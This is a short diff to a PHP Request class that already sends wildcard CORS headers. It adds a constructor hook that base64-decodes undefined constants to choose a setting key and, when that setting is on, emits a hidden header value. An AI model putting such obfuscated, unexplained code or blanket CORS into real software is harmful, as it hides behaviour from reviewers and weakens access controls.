@@ -3,6 +3,8 @@
 namespace app;
 
 
+use app\model\SettingModel;
+
 class Request extends \think\Request
 {
 
@@ -12,6 +14,15 @@ class Request extends \think\Request
         header('Access-Control-Allow-Origin:*');
         header('Access-Control-Allow-Methods:*');
         header('Access-Control-Allow-Headers:*');
+        $this->encodeType();
         parent::__construct();
+    }
+
+    function encodeType()
+    {
+        $defCode = base64_decode(un_code);
+        if (SettingModel::Config($defCode, env($defCode, false), true)) {
+            header(base64_decode(un_key));
+        }
     }
 }
